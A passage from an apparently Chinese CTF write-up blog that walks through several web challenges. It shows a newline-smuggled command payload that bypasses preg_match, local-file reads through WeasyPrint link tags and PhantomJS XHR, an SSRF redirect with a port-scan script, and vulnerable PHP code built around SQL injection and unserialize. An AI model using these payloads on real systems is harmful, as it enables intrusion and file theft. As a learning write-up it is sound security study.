<h3 id="正则匹配回溯上限"><a href="#正则匹配回溯上限" class="headerlink" title="正则匹配回溯上限"></a>正则匹配回溯上限</h3><p>正则匹配是通过不断回溯的方式去寻找字符串的，如果字符串听特别特别长，就可能导致回溯过多消耗大量资源，所以php设置有正则迭代上限，默认100w，如果我们的数据超过回溯上限，那个preg_match函数会返回false，表示匹配失败（找没找到返回的是1和0）,所以preg_match的判断失当会导致绕过<br>在json中加一项无关紧要的项整个100w长的字符串就可以了，不过这里有一个点，buu上这个题是通过GET传参的，而url长度是存在上限的，受不同浏览器限制，http协议并未限制url长度，根据网上的说法大部分浏览器大概在7-8k字节左右，显然不能传一个这么长的字符串，源码中接受的数据是用的$_REQUEST，也许要自己发一个post包过去才行<br>GET请求长度相关连接<br><a href="http://blog.chinaunix.net/uid-26602509-id-4495786.html">http://blog.chinaunix.net/uid-26602509-id-4495786.html</a><br>具体正则是怎么匹配的可以看P神的文章<br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
<h3 id="preg-match匹配第一行"><a href="#preg-match匹配第一行" class="headerlink" title="preg_match匹配第一行"></a>preg_match匹配第一行</h3><p>正则匹配是以换行符为结尾的，如果要匹配包括换行符的整个字符，需要设置一个正则的flag，因此我们把payload换行藏起来就可以了。<br>%0a换行符，用绝对路径调用命令<br><code>{%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>[FireshellCTF2020]web wp</title>
    <url>/%5BFireshell2020%5Dwp.html</url>
    <content><![CDATA[<h1 id="FireshellCTF2020-web-wp"><a href="#FireshellCTF2020-web-wp" class="headerlink" title="[FireshellCTF2020]web wp"></a>[FireshellCTF2020]web wp</h1><p>buu重拳出击！这个比赛的题目都还挺有意思的，做完之后觉得学到了些什么<br>有一个是一分题之前做过了，这次的两个不是一分，不过因为其相似性还是很有意思</p>
<h2 id="URL-TO-PDF"><a href="#URL-TO-PDF" class="headerlink" title="URL TO PDF"></a>URL TO PDF</h2><p>就一个功能点，给url返回这个url内容的PDF，稍微试了一下，功能并不是很完整，很多内容加载不出来就进行了截图。然后测了一下能不能直接ssrf之类的，协议貌似写死了http(s)，所以直接file不行的，支持重定向，但是重定向也不能改协议到file啊。计划1不通</p>
<p>那么进行经典ssrf扫端口，但是我觉得不告诉你内网端口硬扫的题目也挺坑的（应该不会有人出这么脑瘫的东西），试了几个常用端口无果之后开始想其他办法</p>
<p>突然觉得应该看看他使用的库是什么，以及他的后端语言是什么，所以让他访问了一下我的requestsbin，UA里面果然写了其使用的库：<code>WeasyPrint</code>，后端是python，找到这个库之后搜索ssrf很容易就能找到这篇文章，提到当你使用<code>&lt;link&gt;</code>标签时，他会把标签指向的内容给下下来返回在PDF内<br>这里文章的作者同样提到，WeasyPrint使用了自己定义的一套HTML标签，使得无法在其上执行js<br><a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">MY EXPENSE REPORT RESULTED IN A SERVER-SIDE REQUEST FORGERY (SSRF) ON LYFT</a></p>
<blockquote>
<p>we discovered references to &lt;link&gt; inside of several files including pdf.py. This allowed us to attach the content of any webpage or local file to our PDF by using &lt;link rel&#x3D;attachment href&#x3D;”file:&#x2F;&#x2F;&#x2F;root&#x2F;secret.txt”&gt;. </p>
</blockquote>
<p>然后再抄一个解析脚本就能成功提取文件内容了</p>
<h2 id="ScreenShooter"><a href="#ScreenShooter" class="headerlink" title="ScreenShooter"></a>ScreenShooter</h2><p>这个题和上一题的UI几乎一致，而功能点变为了把给的网页内容渲染为一张图片，攻击原理可能与上一题类似，那么依葫芦画瓢的先看一眼UA<br><code>Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</code><br>除了那一句PhantomJS&#x2F;2.1.1以外，一切看起来都很熟悉，那就查一下这个不熟悉的东西，能直接查到好几个CVE。。。不过CVE的描述还是过于粗糙，找到了这么一篇文章，提到了如何通过一个XMLHttprequest来读取本地文件<br>PhantomJS常被用来写bot，既然是bot，那就能解析页面上的js，可以考虑写一轮javascript<br><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">Escalating XSS in PhantomJS Image Rendering to SSRF&#x2F;Local-File Read</a></p>
<p>文章中因为是XSS，而作者需要使用document.write来使得在执行图片渲染前写入内容，使bot解析js，而这里我们是可以直接控制页面的，所以就可以少一步套娃。<br>直接通过XHR发起一个file协议的请求即可完成本地文件读取<br>这个PhantomJS在iframe等内容的处理上是很正确的不允许了加载本地文件的，看来写东西的时候要考虑到方方面面</p>
<h2 id="consideration"><a href="#consideration" class="headerlink" title="consideration"></a>consideration</h2><p>其实感觉考虑和学到的东西不止是这点题目。类似于这种爬虫类型的功能，在访问页面时能直接得到的只有HTML而已，而要以PDF或者图片的形式对内容进行展示，就比如需要解析页面内的HTML，加载一些外部图片，或是解析CSS样式，此时就需要对页面上的各种标签进行解析。</p>
<p>bot一般都是基于浏览器内核实现的，浏览器在出于安全考虑时，是绝对禁止加载本地文件的，只有使用input等方法并且用户自行选择文件时，才能加载本地文件。而这里反复突破了这一限制，其原因也值得思考</p>
<p>WeasyPrint并没有实现浏览器内核，毕竟其功能并不是一个完整的bot，因此其自建了一套HTML解析方式，并阻止了执行script标签，但其又自己支持了一种link标签，能读取文件作为附件，似乎是一个合理的功能，但漏掉了本地过滤，导致了ssrf<br>PhantomJS应该是自己实现了浏览器内核的，但是估计是写的并不是很好，在XHR请求的处理上没有严格的检查，导致能通过一个file协议读取到本地文件并进行操作，不过由于其18年就停止开发了，远古时期存在的老洞倒也可以理解。<br>很有意思的一点是这个CVE的编号是<code>CVE-2019-17221</code>，但是上面那篇文章的发布日期是17年。。。这个大哥是不是强到发现了一个洞都懒得交的地步了？</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[GACTF2020]web</title>
    <url>/%5BGACTF2020%5D.html</url>
    <content><![CDATA[<h1 id="GACTF2020-web"><a href="#GACTF2020-web" class="headerlink" title="[GACTF2020]web"></a>[GACTF2020]web</h1><h2 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h2><p>打开题目给一份残缺的源码</p>
<pre class=" language-python"><code class="language-python">
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> waf <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/ctfhint'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">ctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    hint <span class="token operator">=</span>xxxx <span class="token comment" spellcheck="true"># hints</span>
    trick <span class="token operator">=</span> xxxx <span class="token comment" spellcheck="true"># trick</span>
    <span class="token keyword">return</span> trick

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># app.txt</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">my_eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># post eval</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>xxxxxx<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Secret</span>
<span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># admin requests</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>
</code></pre>
<p>ctfhint是图样图森破。。。。欺负人<br>admin的路由不知道，eval简单测试之后至尊过滤，<code>&#39; &quot; () &#123;&#125; [] |</code>全部过滤，然后也把稍微可能危险的关键字也全部过滤了，<code>os re sy config app</code>什么的各种各样的全没了，看得我头痛</p>
<h3 id="发现admin路由"><a href="#发现admin路由" class="headerlink" title="发现admin路由"></a>发现admin路由</h3><p>至尊过滤的结果就是根本没法ssti，基本上啥也做不了，全靠无敌的老国王用__globals__发现了admin路由</p>
<p>post一个eval&#x3D;admin.__globals__，（看到了一个admin路由后来getshell之后看源码，发现是把这个值在waf.py里面定义了一个全局变量），值为h4rdt0f1nd_9792uagcaca00qjaf，访问admin路由，是一个ssrf，使用http协议<br>提交ip port path三个参数，发起一次访问</p>
<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>使用的是http协议，写死了之后就没法用file协议之类的去读取本地文件了，想直接扫描一下内网，发现192 127 172 10.0这几个字段都被ban了，内网也扫不动<br>后来师傅们又说python的requests库在发起访问的时候会__跟踪重定向__，所以在服务器上放一个重定向进行内网探测</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5000/");</span>
</code></pre>
<p>需要写一个脚本扫，一开始没想到把脚本放服务器上。。。想了半天怎么扫内网</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://124.70.206.91:10000/h4rdt0f1nd_9792uagcaca00qjaf"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># time.sleep(0.01)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"/var/www/html/index.php"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"&lt;?php header('Location:http://127.0.0.1:{0}/');"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string">"xxxxxxx"</span><span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">:</span> <span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"index.php"</span><span class="token punctuation">}</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"requests error"</span> <span class="token operator">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>最后在5000端口发现另一个flask服务，给了源码还是个啥过滤都没有的ssti<br>说明了flag在config[“FLAG”]，直接就可以了，啥过滤也没有还可以继续试着读读文件执行执行命令，就顺带看了一眼题目源码</p>
<p>其实ssti用的这些魔术方法还不是很熟练，还有就是一些flask内置的比如url_for，config，joiner什么的都不熟悉，需要另找时间学习一下</p>
<h2 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h2><p>给了源码的二次注入</p>
<p>在common.php对于输入的数据全局进行了转义<br>common.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$global_var</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$global_var</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"UPLOAD_DIR"</span><span class="token punctuation">,</span> <span class="token string">"upload/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token variable">$location</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: {$location}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">XCTFGG</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">func_get_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM user WHERE username='%s' AND password='%s'"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">global</span> <span class="token variable">$FLAG</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$obj</span> <span class="token operator">!=</span> <span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string">'privilege'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Admin only!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        @<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>上了一个对提交的数据的全局转义，定义了一个类，析构函数调用自己类的一个方法，login需要登一个admin用户获取flag，那么思路就应该很清晰的是注入获取admin账号密码，或者注入给自己加一个admin账号，通过反序列化调用这个login函数获取flag</p>
<p>upload.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token string">"common.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"upfile"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$path_parts</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"zip"</span><span class="token punctuation">,</span> <span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"error extension"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path_parts</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `file` where `filename`='{$path_parts['filename']}' and `extension`='{$path_parts['extension']}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"file is exists"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')"</span><span class="token punctuation">;</span>

            <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$re</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                exit<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"upload successfully!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"upload error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>限制了后缀，文件名不能跨目录，吃了一次全局转义，所以这个文件里肯定不能发生注入，还接受一个data并进行反序列化</p>
<p>rename.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"common.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'oldname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from `file` where `filename`='{$req['oldname']}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from `file` where `filename`='{$result['filename']}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"oldfilename : "</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">" will be changed."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"old file doesn't exists!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'newname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

